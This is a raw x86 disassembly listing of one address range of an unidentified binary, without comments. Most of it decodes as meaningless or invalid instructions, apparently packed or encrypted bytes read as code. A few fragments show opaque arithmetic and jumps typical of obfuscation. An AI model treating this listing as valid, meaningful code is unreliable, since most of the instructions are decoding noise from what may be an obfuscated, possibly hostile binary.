  40e931:	call   FWORD PTR [ebx+0x42]
  40e934:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e936:	imul   DWORD PTR [eax+0x1b]
  40e939:	push   ebp
  40e93a:	cmc    
  40e93b:	sub    DWORD PTR [ebx+ecx*1],edi
  40e93e:	pushf  
  40e93f:	mov    ch,0x1f
  40e941:	mov    BYTE PTR [ebp-0x79abaebc],0xa4
  40e948:	add    DWORD PTR [eax-0x5feadf0c],edx
  40e94e:	inc    eax
  40e94f:	lds    ebx,FWORD PTR [eax]
  40e951:	ja     0x40e9a3
  40e953:	aas    
  40e954:	and    ebp,esi
  40e956:	pop    ebp
  40e957:	(bad)  
  40e958:	xor    BYTE PTR [esi],dh
  40e95a:	adc    dl,cl
  40e95c:	jnp    0x40e942
  40e95e:	push   ecx
  40e95f:	ins    BYTE PTR es:[edi],dx
  40e960:	mov    esp,0xa726a078
  40e965:	fwait
  40e966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e967:	cmp    al,0xa4
  40e969:	jmp    0x59e1:0x6350db09
  40e970:	test   al,0xb4
  40e972:	aad    0x89
  40e974:	sar    al,cl
  40e976:	or     BYTE PTR [ecx+edi*1],bh
  40e979:	pop    DWORD PTR [ebp+ebx*2+0x3a]
  40e97d:	push   DWORD PTR [edi+0x39e22e7]
  40e983:	js     0x40e9b1
  40e985:	fdivr  QWORD PTR ds:0xaea05f33
  40e98b:	inc    ecx
  40e98c:	mov    esp,0x170e3929
  40e991:	and    cl,bl
  40e993:	loopne 0x40e9f8
  40e995:	push   ecx
  40e996:	cmp    DWORD PTR ds:0x3799678a,eax
  40e99c:	mov    ah,0x74
  40e99e:	sahf   
  40e99f:	mov    ebp,0x87a56e7e
  40e9a4:	nop
  40e9a5:	in     eax,0x68
  40e9a7:	mov    dl,0x6e
  40e9a9:	jno    0x40e97a
  40e9ab:	cmp    al,BYTE PTR [eax+0x72aad0ea]
  40e9b1:	mov    al,ds:0x8b23506
  40e9b6:	retf   
  40e9b7:	clts   
  40e9b9:	dec    ebp
  40e9ba:	popa   
  40e9bb:	cmp    eax,0x2668454e
  40e9c0:	cmp    DWORD PTR [edx],edx
  40e9c2:	add    BYTE PTR [ebx-0xe96adb7],ah
  40e9c8:	sahf   
  40e9c9:	fmul   DWORD PTR [eax+0x5839e855]
  40e9cf:	(bad)  
  40e9d0:	push   ds
  40e9d1:	and    al,0x27
  40e9d3:	and    eax,0x33bc1e24
  40e9d8:	xor    al,0x83
  40e9da:	or     DWORD PTR [edi],0x3bcf330e
  40e9e0:	mov    bh,0xcd
  40e9e2:	sahf   
  40e9e3:	int    0xfd
  40e9e5:	add    eax,0xcc94558d
  40e9ea:	bnd jg 0x40ea5e
  40e9ed:	mov    ebp,0xdad9da4e
  40e9f2:	test   DWORD PTR [eax],0x56acc206
  40e9f8:	movlps xmm6,QWORD PTR [ecx+0x23]
  40e9fc:	mov    ds:0x160fb85b,al
  40ea01:	push   es
  40ea02:	iret   
  40ea03:	and    DWORD PTR [ecx+ebx*4-0x74517fe5],0xffffffd3
  40ea0b:	sbb    DWORD PTR [edi+0x8d70aea],edi
  40ea11:	pushf  
  40ea12:	add    al,0x26
  40ea14:	stc    
  40ea15:	ss cdq 
  40ea17:	push   cs
  40ea18:	push   ebx
  40ea19:	arpl   WORD PTR [edi+eax*8+0x43],bx
  40ea1d:	mov    ds:0x340f3f9e,eax
  40ea22:	mov    bl,0x88
  40ea24:	jmp    FWORD PTR [ecx+eax*1-0x71]
  40ea28:	add    eax,0x6d310c71
  40ea2d:	sbb    edi,esp
  40ea2f:	stc    
  40ea30:	loopne 0x40e9cd
  40ea32:	aaa    
  40ea33:	pop    es
  40ea34:	pushf  
  40ea35:	xlat   BYTE PTR ds:[ebx]
  40ea36:	push   ecx
  40ea37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea38:	dec    edi
  40ea39:	in     al,0xa2
  40ea3b:	cli    
  40ea3c:	sbb    eax,ebx
  40ea3e:	push   esp
  40ea3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea40:	adc    al,0x16
  40ea42:	push   edx
  40ea43:	call   0xefca:0x2b3cdc01
  40ea4a:	enter  0xe21a,0x7c
  40ea4e:	fiadd  DWORD PTR [eax-0x73]
  40ea51:	out    dx,eax
  40ea52:	adc    eax,0x6ef010ac
  40ea57:	inc    ebx
  40ea58:	fstp   TBYTE PTR [eax+0x3a8d5d9]
  40ea5e:	daa    
  40ea5f:	shl    DWORD PTR [edx-0x2d403eff],1
  40ea65:	or     eax,0x9a23159
  40ea6a:	jnp    0x40eace
  40ea6c:	jmp    0x40ead6
  40ea6e:	jmp    0x8c664b34
  40ea73:	and    eax,0x2a5659c0
  40ea78:	push   esi
  40ea79:	ret    
  40ea7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea7b:	out    dx,eax
  40ea7c:	lea    ecx,[ecx+eax*8-0x208f4e39]
  40ea83:	adc    al,0x40
  40ea85:	lods   eax,DWORD PTR ds:[esi]
  40ea86:	and    al,0xa7
  40ea88:	(bad)  
  40ea8a:	sbb    DWORD PTR [esi],ebp
  40ea8c:	aam    0x40
  40ea8e:	push   edx
  40ea8f:	push   esp
  40ea90:	(bad)  
  40ea91:	sub    dl,BYTE PTR [edx]
  40ea93:	adc    al,al
  40ea95:	mov    edi,0x7ed3723b
  40ea9a:	shl    DWORD PTR [eax+0x6149645b],1
  40eaa0:	xor    BYTE PTR [edi],dl
  40eaa2:	xor    edx,edx
  40eaa4:	div    edi
  40eaa6:	mov    edx,DWORD PTR ds:0x422598
  40eaac:	mov    edx,DWORD PTR [edx+0x1d4]
  40eab2:	sub    edx,eax
  40eab4:	mov    eax,DWORD PTR [ebp+0x10]
  40eab7:	mov    al,BYTE PTR [esi+eax*1]
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0xa2aa14b9
  40eaf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaf2:	mov    edi,0x18b8fdb0
  40eaf7:	sbb    dl,dl
  40eaf9:	adc    al,0x18
  40eafb:	sbb    BYTE PTR [ecx+0x2131b831],bl
  40eb01:	xchg   ebp,eax
  40eb02:	jecxz  0x40eb24
  40eb04:	(bad)  [edi]
  40eb06:	loope  0x40ea8f
  40eb08:	retf   0x8a26
  40eb0b:	jne    0x40eb71
  40eb0d:	mov    ecx,0x1e534f33
  40eb12:	js     0x40eb76
  40eb14:	stc    
  40eb15:	and    ah,BYTE PTR ds:0x42640d1d
  40eb1b:	sub    DWORD PTR [eax+0x2500453f],ebx
  40eb21:	(bad)  
  40eb22:	pop    esi
  40eb23:	enter  0xb709,0x3a
  40eb27:	and    cl,BYTE PTR [ebx]
  40eb29:	mov    bl,0xb2
  40eb2b:	call   0x18c8:0x5c2164d6
  40eb32:	sbb    dh,BYTE PTR [edx]
  40eb34:	xor    BYTE PTR [ebx+0x20],0xbf
  40eb38:	iret   
  40eb39:	mov    esp,0x30614b78
  40eb3e:	stc    
  40eb3f:	jnp    0x40eadb
  40eb41:	or     BYTE PTR [ecx+eiz*8],0xb7
  40eb45:	push   ecx
  40eb46:	pusha  
  40eb47:	mov    fs:0x8cf70465,eax
  40eb4d:	add    esp,DWORD PTR [edi-0x65]
  40eb50:	repnz imul esp,DWORD PTR [edx],0x7b6a696f
  40eb57:	push   0xc771e12
  40eb5c:	clc    
  40eb5d:	jp     0x40eb35
  40eb5f:	mov    ebx,0x9f62586
  40eb64:	inc    ecx
  40eb65:	aas    
  40eb66:	test   eax,0xfdeeaad8
  40eb6b:	(bad)  
  40eb6c:	and    DWORD PTR [eax-0x47],edx
  40eb6f:	ins    BYTE PTR es:[edi],dx
  40eb70:	loope  0x40ebd2
  40eb72:	int    0xef
  40eb74:	ret    0x8cb1
  40eb77:	fnsave [ebx]
  40eb79:	(bad)  
  40eb7a:	push   edx
  40eb7b:	pop    es
  40eb7c:	jg     0x40eb5b
  40eb7e:	cmp    DWORD PTR [ebp-0x1e],eax
  40eb81:	ss (bad) 
  40eb83:	test   al,0x1d
  40eb85:	jb     0x40eb63
  40eb87:	xchg   ebp,eax
  40eb88:	je     0x40eb8a
  40eb8a:	adc    edx,DWORD PTR [ebp+0x26]
  40eb8d:	xchg   esp,eax
  40eb8e:	sbb    BYTE PTR [eax+ebp*8+0x5064410e],cl
  40eb95:	jl     0x40ebad
  40eb97:	jbe    0x40eb53
  40eb99:	cmp    eax,0x2dae7972
  40eb9e:	retf   
  40eb9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eba0:	ret    
  40eba1:	div    BYTE PTR [edi-0x5204ba8d]
  40eba7:	adc    edi,ebx
  40eba9:	rcr    DWORD PTR gs:[edx],cl
  40ebac:	sub    DWORD PTR ds:0x288f06,eax
  40ebb2:	cmp    eax,DWORD PTR [ebx]
  40ebb4:	mov    bh,0x25
  40ebb6:	lods   eax,DWORD PTR ds:[esi]
  40ebb7:	and    eax,0xdfb8ca08
  40ebbc:	adc    cl,BYTE PTR [edi-0x55c36519]
  40ebc2:	adc    BYTE PTR [edi-0x51],dl
  40ebc5:	and    al,0xb0
  40ebc7:	fnsave [ebp+0x62]
  40ebca:	ins    DWORD PTR es:[edi],dx
  40ebcb:	jbe    0x40ebce
  40ebcd:	jmp    0xc1dcbe39
  40ebd2:	add    BYTE PTR [edi+0x5ff46c62],bh
  40ebd8:	xchg   edx,eax
  40ebd9:	pop    ss
  40ebda:	push   ss
  40ebdb:	mov    ebx,DWORD PTR [eax]
  40ebdd:	sar    DWORD PTR [edx-0x7cec4925],0x64
  40ebe4:	enter  0xb819,0x10
  40ebe8:	cmp    BYTE PTR [edi+0x139addac],bl
  40ebee:	mov    dh,0xa9
  40ebf0:	aam    0x94
  40ebf2:	xacquire xchg BYTE PTR [edx-0x1e],bh
  40ebf6:	pusha  
  40ebf7:	xor    dh,ah
  40ebf9:	lds    esi,FWORD PTR [ecx]
  40ebfb:	sbb    al,BYTE PTR [ebx+edx*1]
  40ebfe:	cdq    
  40ebff:	xchg   esp,eax
  40ec00:	add    ah,BYTE PTR [ecx]
  40ec02:	inc    ecx
  40ec03:	mov    ds:0xa05b5659,eax
  40ec08:	mov    ds:0x2d779723,eax
  40ec0d:	adc    al,0x3f
  40ec0f:	xor    edx,DWORD PTR [eax+eax*8-0x7c8bde44]
  40ec16:	and    eax,0x28ac1be2
  40ec1b:	cwde   
  40ec1c:	stos   BYTE PTR es:[edi],al
  40ec1d:	out    dx,al
  40ec1e:	lods   al,BYTE PTR ds:[esi]
  40ec1f:	inc    edi
  40ec20:	fisubr DWORD PTR [edi-0x7bb347d9]
  40ec26:	stos   BYTE PTR es:[edi],al
  40ec27:	ss inc esi
  40ec29:	add    dl,BYTE PTR [eax+ecx*1-0x29]
  40ec2d:	mov    edi,0x5f0fda11
  40ec32:	out    dx,al
  40ec33:	inc    ecx
  40ec34:	pop    ebp
  40ec35:	inc    ebx
  40ec36:	mov    esp,0xb361ecea
  40ec3b:	xor    BYTE PTR [eax-0x5df08a8b],dh
  40ec41:	and    bh,BYTE PTR [ebp+edx*8+0x265c5a6d]
  40ec48:	rol    ebx,0xb8
  40ec4b:	xor    al,0x55
  40ec4d:	sbb    eax,0xa09f4b0
  40ec52:	call   0xa6cd:0x8ccd4fc7
  40ec59:	std    
  40ec5a:	gs push 0x28
  40ec5d:	dec    edx
  40ec5e:	outs   dx,DWORD PTR ds:[esi]
  40ec5f:	fstp   QWORD PTR fs:[eax]
  40ec62:	fsubr  DWORD PTR [edx+eiz*8+0x37]
  40ec66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec67:	jmp    0x40ec8b
  40ec69:	fnstcw WORD PTR [eax]
  40ec6b:	push   ecx
  40ec6c:	loop   0x40ecd0
  40ec6e:	test   BYTE PTR [ecx-0x24],ah
  40ec71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec72:	out    0x36,eax
  40ec74:	push   cs
  40ec75:	inc    esp
  40ec76:	xchg   ebx,eax
  40ec77:	ja     0x40ec56
  40ec79:	shr    DWORD PTR [ecx-0x49],0x12
  40ec7d:	cmp    DWORD PTR [ecx-0x31],edx
  40ec80:	pop    ds
  40ec81:	adc    eax,0xfd8f168a
  40ec86:	push   ebp
  40ec87:	repnz sbb BYTE PTR [ebp+0x39],bl
  40ec8b:	mov    bh,0x61
  40ec8d:	out    dx,eax
  40ec8e:	mov    esp,0xc1f94532
  40ec93:	clc    
  40ec94:	scas   eax,DWORD PTR es:[edi]
  40ec95:	pop    ds
  40ec96:	rcl    BYTE PTR [ecx],1
  40ec98:	pop    esi
  40ec99:	push   0x82abbe63
  40ec9e:	sbb    eax,DWORD PTR [eax+0x29]
  40eca1:	aad    0xf8
  40eca3:	test   ebx,edi
  40eca5:	pop    eax
  40eca6:	mov    ah,0xa6
  40eca8:	mov    dl,0xce
  40ecaa:	popa   
  40ecab:	cdq    
  40ecac:	sbb    DWORD PTR [ecx],0xc3ad5c68
  40ecb2:	dec    edx
  40ecb3:	cmp    eax,0x44c49c6b
  40ecb8:	mov    ds:0xd01d24a0,eax
  40ecbd:	mov    edi,0x9c93ec21
  40ecc2:	jle    0x40ec83
  40ecc4:	ret    0xc171
  40ecc7:	push   0x17
  40ecc9:	pop    ebp
  40ecca:	sbb    esi,DWORD PTR [ecx*1-0x7bc89bb2]
  40ecd1:	fsubr  QWORD PTR [edx]
  40ecd3:	mov    DWORD PTR [eax-0x1679bbd6],ebp
  40ecd9:	mov    ecx,0xff80fd0c
  40ecde:	jo     0x40eca0
  40ece0:	stos   DWORD PTR es:[edi],eax
  40ece1:	xchg   ecx,eax
  40ece2:	test   al,0xd7
  40ece4:	fisubr WORD PTR [esi+0x50]
  40ece7:	mov    ebp,0xdc2a8992
  40ecec:	std    
  40eced:	fwait
  40ecee:	pusha  
  40ecef:	sbb    esp,esp
  40ecf1:	fwait
  40ecf2:	cdq    
  40ecf3:	iret   
  40ecf4:	lods   eax,DWORD PTR ds:[esi]
  40ecf5:	imul   esi,DWORD PTR [ecx-0x77954620],0xffffffe8
  40ecfc:	mov    bl,0x73
  40ecfe:	pop    edi
  40ecff:	mov    eax,0xbd4e0d3
  40ed04:	sbb    ch,BYTE PTR [ecx]
  40ed06:	xchg   edi,eax
  40ed07:	ss xor al,0xdf
  40ed0a:	leave  
  40ed0b:	call   0x7bb43aff
  40ed10:	sahf   
  40ed11:	push   0xc
  40ed13:	mov    al,0xf4
  40ed15:	and    DWORD PTR [esi],edi
  40ed17:	jno    0x40ecad
  40ed19:	adc    al,0x44
  40ed1b:	out    dx,eax
  40ed1c:	adc    ch,BYTE PTR [eax]
  40ed1e:	sbb    dl,BYTE PTR [ebp+0x7f8d8af2]
  40ed24:	hlt    
  40ed25:	mov    DWORD PTR [ebp-0x18d3eb09],ebx
  40ed2b:	stos   BYTE PTR es:[edi],al
  40ed2c:	mov    al,ds:0x3dd9d585
  40ed31:	mov    ecx,0xe41e436a
  40ed36:	or     edi,DWORD PTR [ebx-0x24]
  40ed39:	mov    edx,0xc4d23151
  40ed3e:	xor    eax,0x604ce130
  40ed43:	into   
  40ed44:	cmp    BYTE PTR [edi+0x227d9be6],bh
  40ed4a:	jecxz  0x40ed2a
  40ed4c:	push   0xffffffec
  40ed4e:	sbb    eax,0x43481615
  40ed53:	jge    0x40ed99
  40ed55:	retf   
  40ed56:	cmp    BYTE PTR [eax-0x19412318],0x94
  40ed5d:	out    dx,al
  40ed5e:	idiv   DWORD PTR [ecx+ebp*2+0x2d]
  40ed62:	ja     0x40ed30
  40ed64:	jne    0x40ecff
  40ed66:	dec    ebp
  40ed67:	mov    esi,fs
  40ed69:	xchg   edi,eax
  40ed6a:	pop    edi
  40ed6b:	jae    0x40ed5b
  40ed6d:	loop   0x40ed70
  40ed6f:	in     eax,dx
  40ed70:	ret    0x7e34
  40ed73:	scas   eax,DWORD PTR es:[edi]
  40ed74:	jb     0x40ed71
  40ed76:	push   0x2ddd4b8f
  40ed7b:	retf   
  40ed7c:	aam    0x95
  40ed7e:	mov    ecx,0xabdcf73e
  40ed83:	pop    esi
  40ed84:	cmp    ebp,DWORD PTR [edi]
  40ed86:	jecxz  0x40ed61
  40ed88:	retf   0xc61f
  40ed8b:	sbb    ecx,DWORD PTR [ecx+0x7d]
  40ed8e:	js     0x40ede1
  40ed90:	pop    ebp
  40ed91:	adc    edi,0x28
  40ed94:	push   0xffffffa9
  40ed96:	das    
  40ed97:	scas   eax,DWORD PTR es:[edi]
  40ed98:	scas   al,BYTE PTR es:[edi]
  40ed99:	test   eax,0x2e0a27a3
  40ed9e:	jo     0x40ee10
  40eda0:	xor    al,0xf6
  40eda2:	iret   
  40eda3:	lea    ecx,[ecx+eax*1+0x350559e6]
  40edaa:	mov    eax,DWORD PTR [ebp-0xc]
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx+0xaa1270]
  40edd3:	fcom   QWORD PTR [ebp+0x18b2b7bc]
  40edd9:	sbb    dl,dl
  40eddb:	adc    al,0x18
  40eddd:	sbb    al,ah
  40eddf:	dec    esp
  40ede0:	add    bh,bl
  40ede2:	adc    al,0x5
  40ede4:	mov    ebp,0x56b4a5ad
  40ede9:	int3   
  40edea:	add    DWORD PTR [ecx+0x4e],esi
  40eded:	fidiv  WORD PTR [edi-0x4ca465a3]
  40edf3:	and    DWORD PTR [edx],esi
  40edf5:	jecxz  0x40edf5
  40edf7:	arpl   WORD PTR [eax],cx
  40edf9:	ror    edx,cl
  40edfb:	dec    ebp
  40edfc:	imul   esp,edi,0x7f
  40edff:	mov    edi,0x82e99844
  40ee04:	loop   0x40edb8
  40ee06:	loop   0x40edd3
  40ee08:	mov    eax,0x6a880bc4
  40ee0d:	loopne 0x40eddd
  40ee0f:	sahf   
  40ee10:	mov    al,0x27
  40ee12:	es stos DWORD PTR es:[edi],eax
  40ee14:	pop    esi
  40ee15:	dec    ebp
  40ee16:	mov    edx,DWORD PTR [ebp-0x4df7b5ec]
  40ee1c:	fs ins BYTE PTR es:[edi],dx
  40ee1e:	lods   al,BYTE PTR ds:[esi]
  40ee1f:	push   ecx
  40ee20:	fimul  DWORD PTR [ecx-0x12]
  40ee23:	repnz xlat BYTE PTR ds:[ebx]
  40ee25:	xchg   DWORD PTR [edi],ebp
  40ee27:	sub    al,0x3
  40ee29:	add    bl,BYTE PTR [ebp+0x5e8b6d00]
  40ee2f:	and    eax,DWORD PTR cs:[esi-0x48244ed6]
  40ee36:	push   ss
  40ee37:	cmp    al,0x2b
  40ee39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee3a:	les    ebp,FWORD PTR [ebx-0x3f27f5e]
  40ee40:	dec    esi
  40ee41:	mov    BYTE PTR ds:0x207dbf46,al
  40ee47:	xchg   ebp,eax
  40ee48:	xchg   esp,eax
  40ee49:	sbb    BYTE PTR [esi+0x4553b178],al
  40ee4f:	xor    edx,DWORD PTR [edi+eiz*4+0x523c06fe]
  40ee56:	dec    eax
  40ee57:	jo     0x40ee86
  40ee59:	test   eax,edi
  40ee5b:	pop    es
  40ee5c:	stos   BYTE PTR es:[edi],al
  40ee5d:	add    ah,0xbf
  40ee60:	sahf   
  40ee61:	sbb    edi,ebp
  40ee63:	xor    BYTE PTR [ebx],cl
  40ee65:	out    0xc3,eax
  40ee67:	mov    cl,0x7a
  40ee69:	mov    dh,0xe4
  40ee6b:	js     0x40eeb0
  40ee6d:	or     al,0xe1
  40ee6f:	sar    DWORD PTR [ecx+0x7a7bbb4e],1
  40ee75:	dec    edx
  40ee76:	addr16 cdq 
  40ee78:	sub    cl,BYTE PTR [edx-0xfc4ac55]
  40ee7e:	mov    al,0xcc
  40ee80:	mov    esp,DWORD PTR [ecx]
  40ee82:	dec    edi
  40ee83:	mov    bl,bl
  40ee85:	js     0x40eee4
  40ee87:	enter  0x4393,0x1
  40ee8b:	cmp    eax,0xa6e102c1
  40ee90:	cmc    
  40ee91:	hlt    
  40ee92:	jo     0x40ee98
  40ee94:	sub    ch,BYTE PTR [edi+0x55f8b4c4]
  40ee9a:	fsubr  QWORD PTR [ecx]
  40ee9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee9d:	add    edx,edx
  40ee9f:	or     al,0x8a
  40eea1:	or     eax,0xff973a39
  40eea6:	fs leave 
  40eea8:	fwait
  40eea9:	jmp    0x3979c1f1
  40eeae:	fs and eax,0x95e79c3c
  40eeb4:	dec    ebx
  40eeb5:	hlt    
  40eeb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeb7:	call   0x727c5278
  40eebc:	or     ch,BYTE PTR [eax+0x57]
  40eebf:	dec    edi
  40eec0:	pop    ebx
  40eec1:	dec    edx
  40eec2:	or     DWORD PTR [eax+0x48],0x420b5dfa
  40eec9:	inc    edx
  40eeca:	pop    edi
  40eecb:	push   cs
  40eecc:	(bad)  
  40eecd:	test   al,0x43
  40eecf:	hlt    
  40eed0:	in     al,dx
  40eed1:	iret   
  40eed2:	mov    DWORD PTR [esi-0x80],0x347123de
  40eed9:	call   0x3294e523
  40eede:	jo     0x40ee72
  40eee0:	mov    eax,ds:0xe2c88ab4
  40eee5:	jp     0x40ef21
  40eee7:	mov    eax,0x62f46155
  40eeec:	retf   0x7ffd
  40eeef:	mov    bh,BYTE PTR [esi]
  40eef1:	ins    BYTE PTR es:[edi],dx
  40eef2:	call   0x7766:0x3f0af0fd
  40eef9:	jnp    0x40eefc
  40eefb:	fdiv   QWORD PTR [ecx]
  40eefd:	test   al,0xe7
  40eeff:	fnstenv [eax]
  40ef01:	sub    al,0xe1
  40ef03:	jo     0x40ef61
  40ef05:	and    ebx,ebx
  40ef07:	aas    
  40ef08:	les    edx,FWORD PTR [ecx-0x30]
  40ef0b:	loopne 0x40ef08
  40ef0d:	sbb    eax,DWORD PTR [eax-0x7fdcd743]
  40ef13:	mov    dh,0xe3
  40ef15:	mov    ch,0xf2
  40ef17:	sbb    bl,BYTE PTR [eax-0x80]
  40ef1a:	ins    BYTE PTR es:[edi],dx
  40ef1b:	dec    bx
  40ef1d:	jne    0x40ef64
  40ef1f:	scas   eax,DWORD PTR es:[edi]
  40ef20:	je     0x40ef6a
  40ef22:	jae    0x40ef3d
  40ef24:	imul   edi,DWORD PTR [ebx+0x6ead0ce2],0xffffffe8
  40ef2b:	jl     0x40eec6
  40ef2d:	repnz xchg ecx,eax
  40ef2f:	gs dec ecx
  40ef31:	sar    ecx,cl
  40ef33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef34:	popf   
  40ef35:	sub    BYTE PTR [ecx-0x57],ah
  40ef38:	stos   DWORD PTR es:[edi],eax
  40ef39:	or     eax,0x1a93def3
  40ef3e:	xchg   edi,eax
  40ef3f:	push   0xb3c793d4
  40ef44:	xor    dh,bl
  40ef46:	sub    al,0x39
  40ef48:	and    al,0xb2
  40ef4a:	ficomp WORD PTR [edi]
  40ef4c:	mov    eax,DWORD PTR [eax]
  40ef4e:	adc    al,0x86
  40ef50:	aas    
  40ef51:	loope  0x40ef6e
  40ef53:	push   esp
  40ef54:	inc    eax
  40ef55:	jno    0x40efd1
  40ef57:	mov    ds:0xc8fe3ab,eax
  40ef5c:	xchg   BYTE PTR [ebp-0x62],ah
  40ef5f:	mov    BYTE PTR [edi+esi*4],ch
  40ef62:	dec    ecx
  40ef63:	psubsb mm0,QWORD PTR [ebx-0x71f2e223]
  40ef6a:	mov    bh,0xba
  40ef6c:	scas   eax,DWORD PTR es:[edi]
  40ef6d:	bound  esi,QWORD PTR [edi+0x4e40e759]
  40ef73:	cmp    BYTE PTR [ebx-0x552c1a8e],cl
  40ef79:	in     al,dx
  40ef7a:	pop    ss
  40ef7b:	cs int3 
  40ef7d:	mov    ebp,0x25afb804
  40ef82:	xor    eax,ebp
  40ef84:	out    dx,al
  40ef85:	jg     0x40ef09
  40ef87:	xor    eax,0x67ff0d85
  40ef8c:	inc    esp
  40ef8d:	or     BYTE PTR [edi-0x1e],0xeb
  40ef91:	call   0x393ee06d
  40ef96:	sub    ecx,0x651e8fde
  40ef9c:	adc    al,0x1d
  40ef9e:	jnp    0x40f007
  40efa0:	mov    edx,0x32105b45
  40efa5:	xchg   edi,eax
  40efa6:	shl    dh,1
  40efa8:	(bad)  
  40efa9:	add    esp,DWORD PTR [ebp+edi*2-0x44c6ca20]
  40efb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efb1:	mov    tr5,edx
  40efb4:	adc    al,0x59
  40efb6:	pop    edx
  40efb7:	sbb    DWORD PTR [eax],edi
  40efb9:	sbb    BYTE PTR ds:0x340cda5d,al
  40efbf:	mov    ds:0xd2296732,eax
  40efc4:	dec    esp
  40efc5:	test   ebp,ebp
  40efc7:	inc    ecx
  40efc8:	mov    cl,0x78
  40efca:	xor    eax,0xb098ea89
  40efcf:	dec    esi
  40efd0:	lods   al,BYTE PTR ds:[esi]
  40efd1:	xchg   esp,eax
  40efd2:	test   BYTE PTR [ecx+0x6d61fb48],0x21
  40efd9:	push   eax
  40efda:	pop    edi
  40efdb:	aaa    
  40efdc:	push   ecx
  40efdd:	adc    BYTE PTR [edi+eiz*8+0x62],dl
  40efe1:	ins    DWORD PTR es:[edi],dx
  40efe2:	iret   
  40efe3:	hlt    
  40efe4:	add    BYTE PTR [edi-0x263a20b2],0xb2
  40efeb:	adc    eax,0xd91d2b72
  40eff0:	xchg   edx,eax
  40eff1:	xchg   ebp,eax
  40eff2:	jns    0x40f05f
  40eff4:	jae    0x40f065
  40eff6:	retf   
  40eff7:	dec    esp
  40eff8:	dec    edi
  40eff9:	(bad)  
  40effa:	adc    BYTE PTR [ebx],dl
  40effc:	and    BYTE PTR [ecx],bl
  40effe:	mov    al,ds:0xa467b403
  40f003:	xchg   BYTE PTR [esp+edx*1],al
  40f006:	lods   eax,DWORD PTR ds:[esi]
  40f007:	jbe    0x40efc5
  40f009:	retf   0x4709
  40f00c:	imul   esi,DWORD PTR [esi],0x66a89310
  40f012:	and    BYTE PTR [eax-0x2563e075],dl
  40f018:	push   es
  40f019:	push   ecx
  40f01a:	push   edi
  40f01b:	fst    DWORD PTR [ecx]
  40f01d:	xchg   si,ax
  40f01f:	jae    0x40efea
  40f021:	pusha  
  40f022:	pop    ecx
  40f023:	jp     0x40efe3
  40f025:	out    dx,al
  40f026:	int    0x10
  40f028:	lahf   
  40f029:	loopne 0x40efef
  40f02b:	add    bl,ch
  40f02d:	sti    
  40f02e:	pop    ebx
  40f02f:	in     al,0x37
  40f031:	fld    DWORD PTR [ebx+0x697cc6fa]
  40f037:	fwait
  40f038:	and    esi,esp
  40f03a:	fcomip st,st(4)
  40f03c:	pusha  
  40f03d:	jb     0x40f042
  40f03f:	(bad)  ds:0x80a80a3
  40f045:	(bad)  
  40f046:	aas    
  40f047:	data16 je 0x40f030
  40f04a:	dec    esp
  40f04b:	loop   0x40f0a3
  40f04d:	jae    0x40f082
  40f04f:	arpl   WORD PTR [esi+ebx*8-0x435e7c4a],sp
  40f056:	test   eax,0x73c2239c
  40f05b:	adc    edx,0x4319ca3
  40f061:	mov    BYTE PTR [ecx-0x39],cl
  40f064:	xor    BYTE PTR [eax+0x8],0xd8
  40f068:	sbb    DWORD PTR [esi-0x67a53c32],esi
  40f06e:	mov    eax,ds:0x33ec5c45
  40f073:	int    0x2f
  40f075:	ret    
  40f076:	jmp    0xf7c7:0xac23248
  40f07d:	js     0x40f0e9
  40f07f:	es repnz loope 0x40f00a
  40f083:	icebp  
  40f084:	mov    cl,BYTE PTR [edi]
  40f086:	test   DWORD PTR [eax],ecx
  40f088:	idiv   edi
  40f08a:	call   FWORD PTR [edi-0x17]
  40f08d:	mov    edi,0x47000002
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0x4bf7:0xaa146552
  40f09f:	in     eax,0xaa
  40f0a1:	jo     0x40f051
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [eax+0x18],cl
  40f0ab:	cmp    ebp,DWORD PTR [ecx]
  40f0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0ae:	jmp    0x8538:0xa6fa1d26
  40f0b5:	sub    eax,ebx
  40f0b7:	xor    ch,BYTE PTR [ebx]
  40f0b9:	shl    DWORD PTR [edx+0xfb71cbf],1
  40f0bf:	fs cmp ch,bh
  40f0c2:	xchg   ecx,eax
  40f0c3:	mov    ecx,0x8ccfb6ad
  40f0c8:	and    al,0xed
  40f0ca:	xchg   esp,eax
  40f0cb:	jne    0x40f14c
  40f0cd:	fs jge 0x40f148
  40f0d0:	out    dx,al
  40f0d1:	cwde   
